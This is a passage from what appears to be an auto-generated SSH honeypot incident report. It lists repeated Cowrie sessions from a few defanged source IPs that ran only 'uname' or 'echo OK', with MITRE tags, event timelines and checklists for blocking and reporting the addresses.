- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd8a672cb5ba

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 08:10 |
| **Last Seen** | 2026-06-25 08:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:10:23` | `cowrie.session.connect` |
| `2026-06-25 08:10:23` | `cowrie.client.version` |
| `2026-06-25 08:10:23` | `cowrie.client.kex` |
| `2026-06-25 08:10:24` | `cowrie.login.success` |
| `2026-06-25 08:10:25` | `cowrie.session.params` |
| `2026-06-25 08:10:25` | `cowrie.command.input` |
| `2026-06-25 08:10:25` | `cowrie.log.closed` |
| `2026-06-25 08:10:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce8745b3b8eb

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 08:11 |
| **Last Seen** | 2026-06-25 08:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:11:10` | `cowrie.session.connect` |
| `2026-06-25 08:11:10` | `cowrie.client.version` |
| `2026-06-25 08:11:10` | `cowrie.client.kex` |
| `2026-06-25 08:11:10` | `cowrie.login.success` |
| `2026-06-25 08:11:11` | `cowrie.session.params` |
| `2026-06-25 08:11:11` | `cowrie.command.input` |
| `2026-06-25 08:11:11` | `cowrie.log.closed` |
| `2026-06-25 08:11:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e68ff29ec95c

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 08:11 |
| **Last Seen** | 2026-06-25 08:11 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:11:19` | `cowrie.session.connect` |
| `2026-06-25 08:11:19` | `cowrie.client.version` |
| `2026-06-25 08:11:20` | `cowrie.client.kex` |
| `2026-06-25 08:11:20` | `cowrie.login.success` |
| `2026-06-25 08:11:21` | `cowrie.session.params` |
| `2026-06-25 08:11:21` | `cowrie.command.input` |
| `2026-06-25 08:11:22` | `cowrie.log.closed` |
| `2026-06-25 08:11:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c36c8b8c1597

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 08:11 |
| **Last Seen** | 2026-06-25 08:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:11:54` | `cowrie.session.connect` |
| `2026-06-25 08:11:54` | `cowrie.client.version` |
| `2026-06-25 08:11:55` | `cowrie.client.kex` |
| `2026-06-25 08:11:55` | `cowrie.login.success` |
| `2026-06-25 08:11:56` | `cowrie.session.params` |
| `2026-06-25 08:11:56` | `cowrie.command.input` |
| `2026-06-25 08:11:56` | `cowrie.log.closed` |
| `2026-06-25 08:11:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b0d681c6a5c

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 08:12 |
| **Last Seen** | 2026-06-25 08:12 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:12:18` | `cowrie.session.connect` |
| `2026-06-25 08:12:18` | `cowrie.client.version` |
| `2026-06-25 08:12:18` | `cowrie.client.kex` |
| `2026-06-25 08:12:19` | `cowrie.login.success` |
| `2026-06-25 08:12:20` | `cowrie.session.params` |
| `2026-06-25 08:12:20` | `cowrie.command.input` |
| `2026-06-25 08:12:20` | `cowrie.log.closed` |
| `2026-06-25 08:12:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bec1b70faf74

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 08:12 |
| **Last Seen** | 2026-06-25 08:12 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:12:21` | `cowrie.session.connect` |
| `2026-06-25 08:12:21` | `cowrie.client.version` |
| `2026-06-25 08:12:21` | `cowrie.client.kex` |
| `2026-06-25 08:12:22` | `cowrie.login.success` |
| `2026-06-25 08:12:23` | `cowrie.session.params` |
| `2026-06-25 08:12:23` | `cowrie.command.input` |
| `2026-06-25 08:12:23` | `cowrie.log.closed` |
| `2026-06-25 08:12:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3392394d8eec

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 08:12 |
| **Last Seen** | 2026-06-25 08:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:12:43` | `cowrie.session.connect` |
| `2026-06-25 08:12:43` | `cowrie.client.version` |
| `2026-06-25 08:12:43` | `cowrie.client.kex` |
| `2026-06-25 08:12:43` | `cowrie.login.success` |
| `2026-06-25 08:12:44` | `cowrie.session.params` |
| `2026-06-25 08:12:44` | `cowrie.command.input` |
| `2026-06-25 08:12:44` | `cowrie.log.closed` |
| `2026-06-25 08:12:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a68050c11a78

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 08:13 |
| **Last Seen** | 2026-06-25 08:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:13:27` | `cowrie.session.connect` |
| `2026-06-25 08:13:27` | `cowrie.client.version` |
| `2026-06-25 08:13:27` | `cowrie.client.kex` |
| `2026-06-25 08:13:28` | `cowrie.login.success` |
| `2026-06-25 08:13:28` | `cowrie.session.params` |
| `2026-06-25 08:13:28` | `cowrie.command.input` |
| `2026-06-25 08:13:28` | `cowrie.log.closed` |
| `2026-06-25 08:13:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d617a2d42b4

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 08:14 |
| **Last Seen** | 2026-06-25 08:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:14:11` | `cowrie.session.connect` |
| `2026-06-25 08:14:11` | `cowrie.client.version` |
| `2026-06-25 08:14:11` | `cowrie.client.kex` |
| `2026-06-25 08:14:11` | `cowrie.login.success` |
| `2026-06-25 08:14:12` | `cowrie.session.params` |
| `2026-06-25 08:14:12` | `cowrie.command.input` |
| `2026-06-25 08:14:12` | `cowrie.log.closed` |
| `2026-06-25 08:14:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-124c9bb223c6

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 08:14 |
| **Last Seen** | 2026-06-25 08:14 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:14:19` | `cowrie.session.connect` |
| `2026-06-25 08:14:19` | `cowrie.client.version` |
| `2026-06-25 08:14:19` | `cowrie.client.kex` |
| `2026-06-25 08:14:20` | `cowrie.login.success` |
| `2026-06-25 08:14:20` | `cowrie.session.params` |
| `2026-06-25 08:14:20` | `cowrie.command.input` |
| `2026-06-25 08:14:21` | `cowrie.log.closed` |
| `2026-06-25 08:14:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4729c773b327

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 08:14 |
| **Last Seen** | 2026-06-25 08:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:14:57` | `cowrie.session.connect` |
| `2026-06-25 08:14:57` | `cowrie.client.version` |
| `2026-06-25 08:14:57` | `cowrie.client.kex` |
| `2026-06-25 08:14:57` | `cowrie.login.success` |
| `2026-06-25 08:14:58` | `cowrie.session.params` |
| `2026-06-25 08:14:58` | `cowrie.command.input` |
| `2026-06-25 08:14:58` | `cowrie.log.closed` |
| `2026-06-25 08:14:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11b34488f86e

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 08:15 |
| **Last Seen** | 2026-06-25 08:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:15:45` | `cowrie.session.connect` |
| `2026-06-25 08:15:45` | `cowrie.client.version` |
| `2026-06-25 08:15:45` | `cowrie.client.kex` |
| `2026-06-25 08:15:46` | `cowrie.login.success` |
| `2026-06-25 08:15:47` | `cowrie.session.params` |
| `2026-06-25 08:15:47` | `cowrie.command.input` |
| `2026-06-25 08:15:47` | `cowrie.log.closed` |
| `2026-06-25 08:15:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2a300690b9c

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 08:16 |
| **Last Seen** | 2026-06-25 08:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:16:31` | `cowrie.session.connect` |
| `2026-06-25 08:16:31` | `cowrie.client.version` |
| `2026-06-25 08:16:32` | `cowrie.client.kex` |
| `2026-06-25 08:16:32` | `cowrie.login.success` |
| `2026-06-25 08:16:33` | `cowrie.session.params` |
| `2026-06-25 08:16:33` | `cowrie.command.input` |
| `2026-06-25 08:16:33` | `cowrie.log.closed` |
| `2026-06-25 08:16:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01267c8c9c5d

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 08:17 |
| **Last Seen** | 2026-06-25 08:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:17:21` | `cowrie.session.connect` |
| `2026-06-25 08:17:21` | `cowrie.client.version` |
| `2026-06-25 08:17:22` | `cowrie.client.kex` |
| `2026-06-25 08:17:22` | `cowrie.login.success` |
| `2026-06-25 08:17:23` | `cowrie.session.params` |
| `2026-06-25 08:17:23` | `cowrie.command.input` |
| `2026-06-25 08:17:23` | `cowrie.log.closed` |
| `2026-06-25 08:17:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9f4a030da05

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 08:18 |
| **Last Seen** | 2026-06-25 08:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:18:08` | `cowrie.session.connect` |
| `2026-06-25 08:18:08` | `cowrie.client.version` |
| `2026-06-25 08:18:08` | `cowrie.client.kex` |
| `2026-06-25 08:18:09` | `cowrie.login.success` |
| `2026-06-25 08:18:10` | `cowrie.session.params` |
| `2026-06-25 08:18:10` | `cowrie.command.input` |
| `2026-06-25 08:18:10` | `cowrie.log.closed` |
| `2026-06-25 08:18:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-519ac96dfd64

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 08:18 |
| **Last Seen** | 2026-06-25 08:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:18:54` | `cowrie.session.connect` |
| `2026-06-25 08:18:54` | `cowrie.client.version` |
| `2026-06-25 08:18:54` | `cowrie.client.kex` |
| `2026-06-25 08:18:55` | `cowrie.login.success` |
| `2026-06-25 08:18:55` | `cowrie.session.params` |
| `2026-06-25 08:18:55` | `cowrie.command.input` |
| `2026-06-25 08:18:55` | `cowrie.log.closed` |
| `2026-06-25 08:18:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25d554f8e9c4

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 08:19 |
| **Last Seen** | 2026-06-25 08:19 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:19:38` | `cowrie.session.connect` |
| `2026-06-25 08:19:38` | `cowrie.client.version` |
| `2026-06-25 08:19:38` | `cowrie.client.kex` |
| `2026-06-25 08:19:38` | `cowrie.login.success` |
| `2026-06-25 08:19:40` | `cowrie.session.params` |
| `2026-06-25 08:19:40` | `cowrie.command.input` |
| `2026-06-25 08:19:40` | `cowrie.log.closed` |
| `2026-06-25 08:19:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75f0203ccd5c

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 08:19 |
| **Last Seen** | 2026-06-25 08:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:19:41` | `cowrie.session.connect` |
| `2026-06-25 08:19:41` | `cowrie.client.version` |
| `2026-06-25 08:19:41` | `cowrie.client.kex` |
| `2026-06-25 08:19:41` | `cowrie.login.success` |
| `2026-06-25 08:19:42` | `cowrie.session.params` |
| `2026-06-25 08:19:42` | `cowrie.command.input` |
| `2026-06-25 08:19:42` | `cowrie.log.closed` |
| `2026-06-25 08:19:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98d914f6cd19

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 08:20 |
| **Last Seen** | 2026-06-25 08:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:20:25` | `cowrie.session.connect` |
| `2026-06-25 08:20:25` | `cowrie.client.version` |
| `2026-06-25 08:20:25` | `cowrie.client.kex` |
| `2026-06-25 08:20:26` | `cowrie.login.success` |
| `2026-06-25 08:20:27` | `cowrie.session.params` |
| `2026-06-25 08:20:27` | `cowrie.command.input` |
| `2026-06-25 08:20:27` | `cowrie.log.closed` |
| `2026-06-25 08:20:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66fad2287109

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 08:21 |
| **Last Seen** | 2026-06-25 08:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:21:12` | `cowrie.session.connect` |
| `2026-06-25 08:21:12` | `cowrie.client.version` |
| `2026-06-25 08:21:12` | `cowrie.client.kex` |
| `2026-06-25 08:21:12` | `cowrie.login.success` |
| `2026-06-25 08:21:13` | `cowrie.session.params` |
| `2026-06-25 08:21:13` | `cowrie.command.input` |
| `2026-06-25 08:21:13` | `cowrie.log.closed` |
| `2026-06-25 08:21:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5a91567e2c9

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-25 08:21 |
| **Last Seen** | 2026-06-25 08:21 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:21:31` | `cowrie.session.connect` |
| `2026-06-25 08:21:32` | `cowrie.client.version` |
| `2026-06-25 08:21:32` | `cowrie.client.kex` |
| `2026-06-25 08:21:38` | `cowrie.login.success` |
| `2026-06-25 08:21:43` | `cowrie.session.params` |
| `2026-06-25 08:21:43` | `cowrie.command.input` |
| `2026-06-25 08:21:44` | `cowrie.log.closed` |
| `2026-06-25 08:21:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06bccd7fec79

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 08:21 |
| **Last Seen** | 2026-06-25 08:21 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:21:36` | `cowrie.session.connect` |
| `2026-06-25 08:21:36` | `cowrie.client.version` |
| `2026-06-25 08:21:36` | `cowrie.client.kex` |
| `2026-06-25 08:21:36` | `cowrie.login.success` |
| `2026-06-25 08:21:37` | `cowrie.session.params` |
| `2026-06-25 08:21:37` | `cowrie.command.input` |
| `2026-06-25 08:21:37` | `cowrie.log.closed` |
| `2026-06-25 08:21:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a84e53ef7c5

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 08:21 |
| **Last Seen** | 2026-06-25 08:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:21:58` | `cowrie.session.connect` |
| `2026-06-25 08:21:58` | `cowrie.client.version` |
| `2026-06-25 08:21:58` | `cowrie.client.kex` |
| `2026-06-25 08:21:58` | `cowrie.login.success` |
| `2026-06-25 08:21:59` | `cowrie.session.params` |
| `2026-06-25 08:21:59` | `cowrie.command.input` |
| `2026-06-25 08:21:59` | `cowrie.log.closed` |
| `2026-06-25 08:21:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d2b9cf5e114

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 08:22 |
| **Last Seen** | 2026-06-25 08:22 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:22:36` | `cowrie.session.connect` |
| `2026-06-25 08:22:36` | `cowrie.client.version` |
| `2026-06-25 08:22:36` | `cowrie.client.kex` |
| `2026-06-25 08:22:37` | `cowrie.login.success` |
| `2026-06-25 08:22:38` | `cowrie.session.params` |
| `2026-06-25 08:22:38` | `cowrie.command.input` |
| `2026-06-25 08:22:38` | `cowrie.log.closed` |
| `2026-06-25 08:22:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7205f790c6fe

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 08:22 |
| **Last Seen** | 2026-06-25 08:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:22:43` | `cowrie.session.connect` |
| `2026-06-25 08:22:43` | `cowrie.client.version` |
| `2026-06-25 08:22:43` | `cowrie.client.kex` |
| `2026-06-25 08:22:44` | `cowrie.login.success` |
| `2026-06-25 08:22:44` | `cowrie.session.params` |
| `2026-06-25 08:22:44` | `cowrie.command.input` |
| `2026-06-25 08:22:45` | `cowrie.log.closed` |
| `2026-06-25 08:22:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c50bfc9492f3

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 08:23 |
| **Last Seen** | 2026-06-25 08:23 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:23:13` | `cowrie.session.connect` |
| `2026-06-25 08:23:13` | `cowrie.client.version` |
| `2026-06-25 08:23:13` | `cowrie.client.kex` |
